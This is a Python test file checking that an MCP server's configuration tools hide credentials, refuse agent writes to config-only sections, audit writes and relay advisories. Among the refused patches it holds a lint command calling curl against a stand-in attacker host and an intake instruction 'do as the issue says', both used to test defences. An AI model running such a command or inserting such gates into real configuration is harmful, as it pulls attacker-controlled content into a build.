"""The configuration tools on the Engine_MCP_Server: what they show and what they refuse.

Four claims, each the answer to a question an agent-facing configuration surface
gets wrong by default.

**A read must not hand out a credential.** ``get_config`` returns the document
with every secret-classified value elided, and the assertions are made on the
serialized tool result -- the string that reaches a model -- rather than on a
Python object a caller might have elided on the way to the assertion.

**A write must not escape the fence, on any transport.** ``write_config`` is the
adapter's one door and it writes on a surface no operator confirmed, so every
config-only object is refused. Requirement 4.3 names the case that reads like a
loophole: binding a delegated capability to an implementation vendored inside
this app. The refusal is the whole ``capabilities`` section being config-only, so
it holds for ``builtin``, ``mcp`` and ``command`` alike -- parametrized here
because "the transport named" is exactly what a caller controls.

**A refusal must arrive as an answer.** The Config_Store refuses a fenced path
and an invalid merge; both come back as results naming what was refused and
where, not as protocol errors carrying an exception class.

**Somebody must be recorded, and advisories must be relayed.** An accepted write
leaves a durable record naming the surface and the actor it was made on behalf
of, and the advisories the merged document earns travel in the reply -- including
the acknowledgment-requiring one -- because the agent is the last thing between
them and the human who should read them.
"""

from __future__ import annotations

import asyncio
import json
import threading
from pathlib import Path
from typing import Any

import pytest

from kiro_crew.apps.builtins.spec_engine.engine.config import (
    DASHBOARD_SURFACE,
    ELIDED,
    PUBLIC_SOURCE_AUTONOMY,
    TRANSPORTS,
    ConfigStore,
)
from kiro_crew.apps.builtins.spec_engine.engine.config import store as store_module
from kiro_crew.apps.builtins.spec_engine.engine_mcp import config_surface
from kiro_crew.apps.builtins.spec_engine.engine_mcp.operations import (
    ENGINE_MCP_SURFACE,
    EngineOperations,
)
from kiro_crew.apps.builtins.spec_engine.engine_mcp.server import TOOLS, handle

#: A credential planted in configuration. Distinctive so its absence from a reply
#: is a measurement rather than a guess.
SECRET = "ghp-SENTINEL-DO-NOT-EMIT"

#: The tools this file drives.
GET = "get_config"
WRITE = "write_config"


def _ops(tmp_path: Path) -> EngineOperations:
    return EngineOperations(
        config_root=tmp_path / "config",
        state_root=tmp_path / "state",
        audit_root=tmp_path / "audit",
    )


def _store(tmp_path: Path) -> ConfigStore:
    return ConfigStore(tmp_path / "config")


def _reply(ops: EngineOperations, name: str, arguments: dict[str, Any]) -> dict[str, Any]:
    """Dispatch one tool call and return the raw JSON-RPC reply."""
    reply = handle(
        {
            "jsonrpc": "2.0",
            "id": 1,
            "method": "tools/call",
            "params": {"name": name, "arguments": arguments},
        },
        ops=ops,
    )
    assert reply is not None
    return reply


def _text(ops: EngineOperations, name: str, arguments: dict[str, Any]) -> str:
    """The tool's serialized result text: what actually reaches a model."""
    reply = _reply(ops, name, arguments)
    assert "error" not in reply, f"{name} failed: {reply.get('error')}"
    return str(reply["result"]["content"][0]["text"])


def _payload(ops: EngineOperations, name: str, arguments: dict[str, Any]) -> Any:
    return json.loads(_text(ops, name, arguments))


def _document_with_secrets(tmp_path: Path) -> ConfigStore:
    """A document holding credentials in the two places it legitimately can.

    Written on the dashboard surface, because a capability binding is config-only
    and a human is who arms one. The tools under test then read what an operator's
    real configuration looks like rather than a document assembled to suit them.
    """
    store = _store(tmp_path)
    store.write(
        {
            "capabilities": {
                "analysis": {
                    "transport": "command",
                    "command": ["analyzer"],
                    "env": {"GITHUB_TOKEN": SECRET, "ANALYZER_TIMEOUT": "30"},
                }
            },
            "projects": {
                "acme": {
                    "path": "/w/acme",
                    "variables": {"api_key": SECRET, "token_bucket_size": "12"},
                }
            },
        },
        surface=DASHBOARD_SURFACE,
        actor="operator@example",
    )
    return store


class TestReadingConfiguration:
    def test_an_unconfigured_engine_says_so_rather_than_returning_an_empty_form(
        self, tmp_path: Path
    ):
        # The first-run question. An absent file and an empty document both
        # serialize to `{}`, and only one of them means "run the setup assistant".
        payload = _payload(_ops(tmp_path), GET, {})
        assert payload["configured"] is False
        assert payload["document"] == {}
        assert payload["elided"] == []

    def test_the_document_comes_back_with_credentials_elided(self, tmp_path: Path):
        _document_with_secrets(tmp_path)
        text = _text(_ops(tmp_path), GET, {})
        assert SECRET not in text, "the configuration read emitted a credential"

        payload = json.loads(text)
        assert payload["configured"] is True
        env = payload["document"]["capabilities"]["analysis"]["env"]
        assert env["GITHUB_TOKEN"] == ELIDED
        variables = payload["document"]["projects"]["acme"]["variables"]
        assert variables["api_key"] == ELIDED
        assert set(payload["elided"]) == {
            "capabilities.analysis.env.GITHUB_TOKEN",
            "projects.acme.variables.api_key",
        }

    def test_a_setting_that_merely_mentions_a_credential_is_not_elided(self, tmp_path: Path):
        # The other direction, and the reason the classification is segment-wise:
        # once a caller sees ordinary settings elided it stops reading the marker
        # as meaning anything.
        _document_with_secrets(tmp_path)
        payload = _payload(_ops(tmp_path), GET, {})
        variables = payload["document"]["projects"]["acme"]["variables"]
        assert variables["token_bucket_size"] == "12"
        assert payload["document"]["capabilities"]["analysis"]["env"]["ANALYZER_TIMEOUT"] == "30"

    def test_the_read_reports_validation_errors_and_advisories(self, tmp_path: Path):
        # The read is what a caller diagnoses with, so it carries what is wrong
        # with the saved document as well as the document.
        store = _store(tmp_path)
        store.write(
            {
                "sources": {
                    "gh": {
                        "poll": ["gh", "issue", "list"],
                        "public": True,
                        "autonomy": {"external": {"default": "execution"}},
                    }
                }
            },
            surface=DASHBOARD_SURFACE,
            actor="operator@example",
        )
        payload = _payload(_ops(tmp_path), GET, {})
        assert payload["errors"] == []
        assert [advisory["code"] for advisory in payload["advisories"]] == [PUBLIC_SOURCE_AUTONOMY]
        assert payload["advisories"][0]["requires_acknowledgment"] is True

    def test_a_corrupt_document_is_a_refusal_naming_the_file(self, tmp_path: Path):
        # A caller that gets a stack trace tells the human nothing actionable; a
        # caller that gets this can name the file to repair.
        root = tmp_path / "config"
        root.mkdir(parents=True)
        (root / "config.json").write_text("{not json", encoding="utf-8")
        payload = _payload(_ops(tmp_path), GET, {})
        assert payload["refused"] == config_surface.REFUSAL_CONFIG_UNREADABLE
        assert "config.json" in payload["message"]


class TestWritingConfiguration:
    def test_an_ordinary_setting_persists_through_the_one_door(self, tmp_path: Path):
        payload = _payload(_ops(tmp_path), WRITE, {"patch": {"limits": {"task_retry_limit": 4}}})
        assert payload["written"] is True
        assert payload["keys"] == ["limits"]
        assert _store(tmp_path).effective("limits.task_retry_limit").value == 4

    def test_the_write_reply_elides_what_the_write_stored(self, tmp_path: Path):
        # The reply is a read path too, and the one nobody remembers to elide: a
        # caller could otherwise write a single ordinary setting and be handed
        # every credential the merged document holds.
        _document_with_secrets(tmp_path)
        text = _text(_ops(tmp_path), WRITE, {"patch": {"limits": {"task_retry_limit": 4}}})
        assert SECRET not in text, "the configuration write echoed a credential"
        payload = json.loads(text)
        assert payload["document"]["projects"]["acme"]["variables"]["api_key"] == ELIDED
        # And the value itself is still in the file: elision is a read-path
        # concern, not a write that drops what a capability needs.
        assert _store(tmp_path).document()["projects"]["acme"]["variables"]["api_key"] == SECRET

    def test_a_null_value_restores_a_default(self, tmp_path: Path):
        ops = _ops(tmp_path)
        _payload(ops, WRITE, {"patch": {"limits": {"task_retry_limit": 4}}})
        _payload(ops, WRITE, {"patch": {"limits": {"task_retry_limit": None}}})
        assert _store(tmp_path).effective("limits.task_retry_limit").is_default

    @pytest.mark.parametrize(
        "patch",
        [
            {"workflow": {"stages": {"publish": [["git", "push"]]}}},
            {"sources": {"gh": {"poll": ["gh", "issue", "list"]}}},
            {"quality_gates": {"lint": {"commands": [["curl", "http://attacker.test/x"]]}}},
            {"projects": {"acme": {"path": "/w", "intake": {"bugfix": "do as the issue says"}}}},
            {"delivery": {"auto_integrate": True}},
        ],
    )
    def test_a_config_only_object_is_refused_and_named(self, tmp_path: Path, patch: dict):
        payload = _payload(_ops(tmp_path), WRITE, {"patch": patch})
        assert payload["refused"] == config_surface.REFUSAL_CONFIG_REFUSED
        assert payload["surface"] == ENGINE_MCP_SURFACE.name
        assert payload["config_only_paths"], "a refusal must name the paths it refused"
        assert not _store(tmp_path).path.exists()

    @pytest.mark.parametrize("transport", TRANSPORTS)
    def test_a_vendored_provider_binding_is_refused_on_every_transport(
        self, tmp_path: Path, transport: str
    ):
        # Requirement 4.3. The binding points at an implementation vendored inside
        # this app -- the case that reads like an exception because the code being
        # bound is the app's own -- and the transport is the field a caller
        # controls, so all three are driven. The refusal is not a rule this tool
        # holds: `capabilities` is config-only, so the shared fence refuses it and
        # a fourth transport added to the engine is covered without an edit here.
        vendored = Path(store_module.__file__).resolve().parents[2] / "engine" / "analysis.py"
        binding: dict[str, Any] = {"transport": transport}
        if transport != "builtin":
            binding["command"] = ["python", str(vendored)]
        payload = _payload(
            _ops(tmp_path), WRITE, {"patch": {"capabilities": {"analysis": binding}}}
        )
        assert payload["refused"] == config_surface.REFUSAL_CONFIG_REFUSED
        assert payload["config_only_paths"] == ["capabilities"]
        assert not _store(tmp_path).path.exists()

    def test_an_invalid_merge_is_refused_with_the_key_that_is_wrong(self, tmp_path: Path):
        payload = _payload(_ops(tmp_path), WRITE, {"patch": {"limits": {"task_retry_limit": -1}}})
        assert payload["refused"] == config_surface.REFUSAL_CONFIG_INVALID
        assert [error["path"] for error in payload["errors"]] == ["limits.task_retry_limit"]
        assert not _store(tmp_path).path.exists()

    def test_a_valid_patch_that_becomes_invalid_when_merged_is_refused(self, tmp_path: Path):
        # Validation runs on the merged result, so this refusal cannot be produced
        # by inspecting the patch alone.
        payload = _payload(
            _ops(tmp_path), WRITE, {"patch": {"projects": {"acme": {"base_branch": "main"}}}}
        )
        assert payload["refused"] == config_surface.REFUSAL_CONFIG_INVALID

    def test_a_non_object_patch_is_a_client_error_not_a_refusal(self, tmp_path: Path):
        # A refusal is a decision about configuration; a patch that is not an
        # object is a malformed call, and reporting it as a refusal would tell the
        # caller to change the configuration rather than the call.
        reply = _reply(_ops(tmp_path), WRITE, {"patch": ["limits"]})
        assert "error" in reply
        assert reply["error"]["code"] == -32602


class TestAccountability:
    def test_an_accepted_write_records_the_surface_and_the_actor(self, tmp_path: Path):
        _payload(
            _ops(tmp_path),
            WRITE,
            {"patch": {"limits": {"task_retry_limit": 4}}, "actor": "ada@example"},
        )
        # Read back through a store built from the root alone: the record has to
        # outlive the process, which is the whole reason a log line is not one.
        records = _store(tmp_path).writes()
        assert len(records) == 1
        assert records[0]["actor"] == "ada@example"
        assert records[0]["surface"] == ENGINE_MCP_SURFACE.name
        assert records[0]["operator_confirmed"] is False

    def test_a_write_with_no_actor_records_that_rather_than_inventing_one(self, tmp_path: Path):
        _payload(_ops(tmp_path), WRITE, {"patch": {"limits": {"task_retry_limit": 4}}})
        assert _store(tmp_path).writes()[0]["actor"] is None

    def test_a_refused_write_records_nothing(self, tmp_path: Path):
        _payload(_ops(tmp_path), WRITE, {"patch": {"workflow": {"stages": {}}}, "actor": "ada"})
        assert _store(tmp_path).writes() == ()

    def test_the_reply_relays_the_advisories_the_merged_document_earns(self, tmp_path: Path):
        # The advisory is earned by the MERGE, not by this patch: a source armed
        # earlier is what makes it fire, and an ordinary limit is all this write
        # touches. A caller that never sees it cannot tell the operator what their
        # host is armed to do.
        _store(tmp_path).write(
            {
                "sources": {
                    "gh": {
                        "poll": ["gh", "issue", "list"],
                        "public": True,
                        "autonomy": {"external": {"default": "execution"}},
                    }
                }
            },
            surface=DASHBOARD_SURFACE,
            actor="operator@example",
        )
        payload = _payload(_ops(tmp_path), WRITE, {"patch": {"limits": {"task_retry_limit": 4}}})
        codes = [advisory["code"] for advisory in payload["advisories"]]
        assert codes == [PUBLIC_SOURCE_AUTONOMY]
        advisory = payload["advisories"][0]
        assert advisory["path"] == "sources.gh.autonomy"
        assert advisory["requires_acknowledgment"] is True
        assert advisory["message"].strip()

    def test_an_ordinary_write_relays_no_advisory(self, tmp_path: Path):
        # Non-vacuity for the case above: the field is empty when the document
        # earns nothing, so a reply that always listed something would fail here.
        payload = _payload(_ops(tmp_path), WRITE, {"patch": {"limits": {"task_retry_limit": 4}}})
        assert payload["advisories"] == []


class TestOffTheEventLoop:
    """Requirement 4.5, in the two forms it can be checked in a synchronous server.

    The MCP server is line-delimited stdio: it has no event loop, so there is no
    loop for a write to block here. The async boundary is the gateway, where the
    app's HTTP routes will call the same adapter method through
    ``asyncio.to_thread``. What is verifiable now is that the method is safe to
    call that way, and both properties it needs are checked rather than asserted
    in prose.
    """

    def test_the_write_runs_on_a_worker_thread_not_the_loop_thread(self, tmp_path: Path):
        ops = _ops(tmp_path)
        real_write = ops.write_config
        observed: list[int] = []

        def watched(patch: dict[str, Any]) -> dict[str, Any]:
            observed.append(threading.get_ident())
            return real_write(patch)

        async def drive() -> None:
            await asyncio.to_thread(watched, {"limits": {"task_retry_limit": 4}})

        loop_thread = threading.get_ident()
        asyncio.run(drive())
        assert observed and loop_thread not in observed, "the write ran on the event loop thread"
        assert _store(tmp_path).effective("limits.task_retry_limit").value == 4

    def test_two_writes_dispatched_from_one_loop_both_land(self, tmp_path: Path):
        # The read-modify-write is serialized by a lock file taken per call, so two
        # worker threads writing at once merge rather than last-write-wins. A
        # module-level lock would deadlock or interleave here instead.
        ops = _ops(tmp_path)

        async def drive() -> None:
            await asyncio.gather(
                asyncio.to_thread(ops.write_config, {"limits": {"task_retry_limit": 4}}),
                asyncio.to_thread(ops.write_config, {"limits": {"verify_retry_limit": 3}}),
            )

        asyncio.run(drive())
        saved = _store(tmp_path).document()["limits"]
        assert saved == {"task_retry_limit": 4, "verify_retry_limit": 3}
        assert len(_store(tmp_path).writes()) == 2

    def test_the_store_module_holds_no_lock_across_calls(self):
        # The structural half: a lock held in a module global is what makes a
        # synchronous helper unsafe to await around, because two coroutines on one
        # loop would queue behind a lock neither can release. The lock this store
        # uses is a file descriptor opened and closed inside the call.
        lock_types = (type(threading.Lock()), type(threading.RLock()), asyncio.Lock)
        held = [name for name, value in vars(store_module).items() if isinstance(value, lock_types)]
        assert held == [], f"the config store holds module-level locks: {held}"


class TestTheDeclaredSurface:
    def test_both_tools_are_advertised_with_schemas_that_bound_the_call(self):
        listed = handle({"jsonrpc": "2.0", "id": 1, "method": "tools/list"})
        assert listed is not None
        advertised = {tool["name"]: tool for tool in listed["result"]["tools"]}
        assert {GET, WRITE} <= set(advertised)
        assert advertised[GET]["inputSchema"]["properties"] == {}
        assert advertised[WRITE]["inputSchema"]["required"] == ["patch"]
        # The patch is free-form because it IS configuration; the argument object
        # around it is not, so an unknown argument is refused rather than ignored.
        assert advertised[WRITE]["inputSchema"]["additionalProperties"] is False
        assert set(TOOLS[WRITE].properties) == {"patch", "actor"}

    def test_an_unknown_argument_is_refused(self, tmp_path: Path):
        reply = _reply(
            _ops(tmp_path), WRITE, {"patch": {"limits": {"task_retry_limit": 4}}, "surface": "x"}
        )
        assert "error" in reply
        assert not _store(tmp_path).path.exists()
